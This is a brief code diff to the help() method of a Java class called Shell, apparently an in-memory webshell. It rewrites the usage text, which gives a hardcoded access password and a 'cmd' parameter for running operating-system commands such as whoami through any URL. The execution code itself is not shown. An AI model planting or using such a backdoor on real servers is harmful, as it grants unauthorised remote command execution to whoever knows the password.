@@ -24,7 +24,6 @@ public class Shell {
     }
 
     public static String help() {
-        return "Webshell in Memory:\n\n" + "Usage:\n" + "anyurl?passwod=ga0weI //show this help page.\n"
-                + "anyurl?passwod=ga0weI&cmd=whoami  //run os command.\n";
+        return "anyurl?passwod=ga0weI&cmd=whoami  //go with cmd \n";
     }
 }
